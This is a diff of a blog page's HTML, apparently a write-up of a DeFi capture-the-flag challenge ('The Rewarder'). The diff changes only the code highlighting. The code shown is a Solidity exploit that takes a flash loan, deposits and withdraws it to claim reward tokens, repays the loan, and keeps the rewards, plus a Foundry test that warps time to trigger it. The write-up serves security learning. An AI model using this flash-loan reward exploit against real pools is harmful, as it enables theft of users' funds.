+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">rewarder</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">flashLoaner</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_flashLoaner</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">dvt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>.<span style="color:#434f54">liquidityToken</span>();
+</span></span><span style="display:flex;"><span>        <span style="color:#434f54">rwt</span> <span style="color:#728e00">=</span> <span style="color:#434f54">_rewarder</span>.<span style="color:#434f54">rewardToken</span>();
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> run() <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex; background-color:#191919"><span>        <span style="color:#fff;font-weight:bold">uint256</span> poolBalance = dvt.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(flashLoaner));
-</span></span><span style="display:flex; background-color:#191919"><span>        flashLoaner.flashLoan(poolBalance);
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">run</span>() <span style="color:#728e00">external</span> {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">poolBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">dvt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoaner</span>));
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">flashLoaner</span>.<span style="color:#434f54">flashLoan</span>(<span style="color:#434f54">poolBalance</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">function</span> receiveFlashLoan(<span style="color:#fff;font-weight:bold">uint256</span> amount) <span style="color:#fff;font-weight:bold">external</span> {
-</span></span><span style="display:flex; background-color:#191919"><span>        dvt.approve(<span style="color:#fff;font-weight:bold">address</span>(rewarder), amount);
-</span></span><span style="display:flex; background-color:#191919"><span>        rewarder.deposit(amount);
-</span></span><span style="display:flex; background-color:#191919"><span>        rewarder.withdraw(amount);
-</span></span><span style="display:flex; background-color:#191919"><span>        dvt.<span style="color:#fff;font-weight:bold">transfer</span>(<span style="color:#fff;font-weight:bold">address</span>(flashLoaner), amount);
-</span></span><span style="display:flex; background-color:#191919"><span>        <span style="color:#fff;font-weight:bold">uint256</span> rewardBalance = rwt.balanceOf(<span style="color:#fff;font-weight:bold">address</span>(<span style="color:#fff;font-weight:bold">this</span>));
-</span></span><span style="display:flex; background-color:#191919"><span>        rwt.<span style="color:#fff;font-weight:bold">transfer</span>(owner, rewardBalance);
+</span></span><span style="display:flex;"><span>    <span style="color:#728e00">function</span> <span style="color:#d35400">receiveFlashLoan</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>) <span style="color:#728e00">external</span> {
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">rewarder</span>), <span style="color:#434f54">amount</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewarder</span>.<span style="color:#434f54">deposit</span>(<span style="color:#434f54">amount</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rewarder</span>.<span style="color:#434f54">withdraw</span>(<span style="color:#434f54">amount</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">dvt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">flashLoaner</span>), <span style="color:#434f54">amount</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#00979d">uint256</span> <span style="color:#434f54">rewardBalance</span> <span style="color:#728e00">=</span> <span style="color:#434f54">rwt</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#00979d">address</span>(<span style="color:#728e00">this</span>));
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>        <span style="color:#434f54">rwt</span>.<span style="color:#728e00">transfer</span>(<span style="color:#434f54">owner</span>, <span style="color:#434f54">rewardBalance</span>);
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We can use the <a href="https://book.getfoundry.sh/cheatcodes/warp?highlight=vm.warp#examples"  class="external-link" target="_blank" rel="noopener">vm.warp</a>
 to set the <code>block.timestamp</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">function</span> testExploit() <span style="color:#fff;font-weight:bold">public</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT START **/</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">// wait for the next round
-</span></span></span><span style="display:flex; background-color:#191919"><span><span style="color:#007f7f"></span>    vm.warp(<span style="color:#fff;font-weight:bold">block</span>.<span style="color:#fff;font-weight:bold">timestamp</span> + <span style="color:#ff0;font-weight:bold">5</span> <span style="color:#fff;font-weight:bold">days</span>);
-</span></span><span style="display:flex;"><span>    vm.startPrank(attacker);
-</span></span><span style="display:flex; background-color:#191919"><span>    <span style="color:#fff;font-weight:bold">new</span> Exploit(theRewarderPool, flashLoanerPool).run();
-</span></span><span style="display:flex;"><span>    vm.stopPrank();
-</span></span><span style="display:flex;"><span>    <span style="color:#007f7f">/** EXPLOIT END **/</span>
-</span></span><span style="display:flex;"><span>    validation();
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// wait for the next round
+</span></span></span><span style="display:flex; background-color:#e5e5e5"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">warp</span>(<span style="color:#728e00">block</span>.<span style="color:#728e00">timestamp</span> <span style="color:#728e00">+</span> <span style="color:#8a7b52">5</span> <span style="color:#00979d">days</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
+</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#728e00">new</span> <span style="color:#434f54">Exploit</span>(<span style="color:#434f54">theRewarderPool</span>, <span style="color:#434f54">flashLoanerPool</span>).<span style="color:#434f54">run</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>And we passed the challenge! The forge&rsquo;s trace is too large to include
 it right here %)</p>
